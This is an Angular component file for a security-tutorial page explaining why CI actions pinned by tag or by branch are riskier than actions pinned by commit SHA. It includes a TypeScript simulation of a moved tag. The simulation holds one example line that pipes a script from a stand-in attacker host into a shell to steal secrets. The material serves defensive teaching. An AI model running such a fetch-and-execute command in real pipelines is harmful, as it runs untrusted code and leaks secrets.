import { Component } from '@angular/core';
import { CommonModule } from '@angular/common';
import { SubtopicEyebrowComponent } from '../../../../../shared/subtopic-eyebrow/subtopic-eyebrow';
import { PageMetaComponent } from '../../../../../shared/page-meta/page-meta';
import { TheoryBlockComponent, TheoryPoint } from '../../../../../shared/theory-block/theory-block';
import { CodeBlockComponent, CodeTab } from '../../../../../shared/code-block/code-block';
import { TryItComponent, TryItExercise } from '../../../../../shared/try-it/try-it';
import { MisconceptionsComponent, Misconception } from '../../../../../shared/misconceptions/misconceptions';
import { SubtopicNavComponent } from '../../../../../shared/subtopic-nav/subtopic-nav';

const theory: TheoryPoint[] = [
  {
    heading: 'The Page’s Own CI Example Contradicted Its Own QnA Advice',
    points: [
      'The main page’s own QnA on securing CI/CD pipelines states the rule precisely: "pin action versions by commit SHA (not by tag)... tags can be moved; SHAs are immutable." The page’s own "Dependency Audit in CI" codeTab originally used <code>actions/checkout@v4</code>, <code>actions/setup-node@v4</code> — tags, not SHAs — and worse, <code>snyk/actions/node@master</code>, a MUTABLE BRANCH reference, not even a tag.',
      'A tag can be moved by whoever owns the repository’s release process; a branch ref like <code>master</code> changes on every single commit pushed to it. Referencing <code>@master</code> means every workflow run could execute completely different action code than the last run, with zero warning.',
      'This has been fixed on the main page to SHA-pinned references, matching the QnA’s own stated rule — this subtopic traces the concrete attack the SHA pin actually defends against.',
    ],
  },
];

const codeTabs: CodeTab[] = [
  {
    label: 'Simulating a Compromised Action Tag',
    language: 'typescript',
    code: `// A minimal simulation of what "pin by tag" vs "pin by SHA" actually
// resolves to when a tag gets moved -- the exact scenario a tag pin
// (or, worse, a branch pin) leaves a CI pipeline exposed to.

interface ActionRegistry {
  // A tag can be reassigned to point at any commit at any time.
  tags: Map<string, string>;   // tag name -> current commit SHA
  // A commit SHA, once it exists, can never be reassigned to
  // different content -- that's what makes a SHA immutable.
  commits: Map<string, string>; // commit SHA -> actual script content
}

function resolveActionRef(registry: ActionRegistry, ref: string): string {
  // If the ref IS a known commit SHA, resolve directly -- immutable.
  if (registry.commits.has(ref)) return registry.commits.get(ref)!;
  // Otherwise it's a tag (or branch) name -- resolve through the
  // CURRENT mapping, which the repository owner controls and can
  // change at any moment.
  const currentSha = registry.tags.get(ref);
  if (!currentSha) throw new Error(\`Unknown ref: \${ref}\`);
  return registry.commits.get(currentSha)!;
}

// ── Day 1: a workflow using "@v4" runs, gets the legitimate script ──
const registry: ActionRegistry = {
  tags: new Map([['v4', 'sha-legit-abc123']]),
  commits: new Map([
    ['sha-legit-abc123', 'echo "checking out repository"'],
    ['sha-malicious-def456', 'curl attacker.example/steal-secrets.sh | sh'],
  ]),
};

console.log(resolveActionRef(registry, 'v4'));
// "echo \\"checking out repository\\""

// ── Day 2: the tag "v4" is silently moved to point at a different
// commit -- a compromised maintainer account, a malicious PR that
// slipped through review, or a legitimately-intentioned but breaking
// re-tag. The WORKFLOW FILE ITSELF never changed.
registry.tags.set('v4', 'sha-malicious-def456');

console.log(resolveActionRef(registry, 'v4'));
// "curl attacker.example/steal-secrets.sh | sh"
// -- the EXACT SAME "@v4" reference in the EXACT SAME workflow file
// now resolves to attacker-controlled code, with zero change on the
// consuming repository's side at all.

// ── A SHA pin is immune to this specific attack, by construction --
// resolveActionRef('sha-legit-abc123') can only ever return the one
// fixed script content that hash actually corresponds to, forever.
console.log(resolveActionRef(registry, 'sha-legit-abc123'));
// "echo \\"checking out repository\\"" -- unchanged, regardless of
// what happens to any tag or branch in the registry.`,
  },
];

const exercise: TryItExercise = {
  prompt:
    'A teammate argues <code>@master</code> is actually SAFER than <code>@v4</code>, reasoning "master always has the latest security fixes, so we get patches automatically." What real risk does this framing miss entirely?',
  hint: 'Run <code>resolveActionRef</code> against a tag that gets reassigned — now consider: how often does a commit land on a branch versus a tag, and who reviews it before your CI pipeline runs it?',
  solution: `// The framing conflates two different things: "gets fixes
// automatically" and "gets whatever the maintainer pushes,
// automatically, with zero opportunity to review it first."

// A tag ("@v4") is typically only moved deliberately, at a release
// boundary -- there's at least a discrete, auditable event (a new
// release) between one resolved commit and the next. A branch
// ("@master") moves on EVERY commit pushed to it -- potentially many
// times a day, with no release process, no changelog, and no
// opportunity to review before your workflow executes it.

// Concretely: if an attacker compromises the action repository's
// maintainer account (a real, historically-occurred attack pattern
// against popular GitHub Actions and npm packages alike), pushing a
// malicious commit directly to master takes effect on the VERY NEXT
// workflow run across every consumer pinned to "@master" -- no tag
// needs to be moved, no release needs to be cut, nothing needs to
// look unusual from the outside. Pinning to master doesn't get you
// "automatic patches" -- it gets you "automatic everything," with no
// distinction between a legitimate fix and a malicious injection.

// A SHA pin sidesteps this entirely: upgrading requires a DELIBERATE
// edit to the workflow file itself (changing the pinned SHA), which
// is a reviewable, auditable change through the SAME code review
// process that protects every other line of the pipeline.`,
};

const misconceptions: Misconception[] = [
  {
    thought: 'A version tag like <code>@v4</code> is just as safe as a commit SHA, since it points at a specific release.',
    reality: 'A tag is a MUTABLE pointer — the repository owner (or anyone with push access, including an attacker who compromises that access) can reassign it to a different commit at any time, with the workflow file itself never changing. The simulation above shows the exact same <code>@v4</code> reference resolving to completely different code before and after a tag reassignment. A commit SHA cannot be reassigned — by definition, it always refers to the one fixed set of bytes that hash to it.',
  },
  {
    thought: 'Pinning to a branch like <code>@master</code> is a reasonable way to always stay on the latest, most up-to-date code.',
    reality: 'It means running WHATEVER the most recent commit on that branch happens to be, at the exact moment your workflow executes — with no release process, no changelog, and no review checkpoint between one run and the next. This is strictly riskier than a tag, which at least changes only at a deliberate release boundary.',
  },
  {
    thought: 'SHA-pinning only matters for third-party actions from unknown publishers — official actions like <code>actions/checkout</code> are safe to reference by tag.',
    reality: 'The risk isn’t about WHO publishes the action — it’s about whether the reference itself is mutable. Even an official, well-maintained action’s tag could theoretically be moved (accidentally or through a compromised release process); the QnA’s own advice to pin by SHA makes no exception for "trusted" publishers, and the fixed main-page codeTab now SHA-pins every action, official and third-party alike.',
  },
];

@Component({
  selector: 'app-sec-supply-chain-sha-pin',
  standalone: true,
  imports: [CommonModule, SubtopicEyebrowComponent, PageMetaComponent, TheoryBlockComponent,
    CodeBlockComponent, TryItComponent, MisconceptionsComponent, SubtopicNavComponent],
  templateUrl: './sha-pinned-actions-why-v4-and-master-both-fail.html',
  styleUrl: './sha-pinned-actions-why-v4-and-master-both-fail.scss',
})
export class ShaPinnedActionsWhyV4AndMasterBothFailSubtopic {
  theory = theory;
  codeTabs = codeTabs;
  exercise = exercise;
  misconceptions = misconceptions;
}
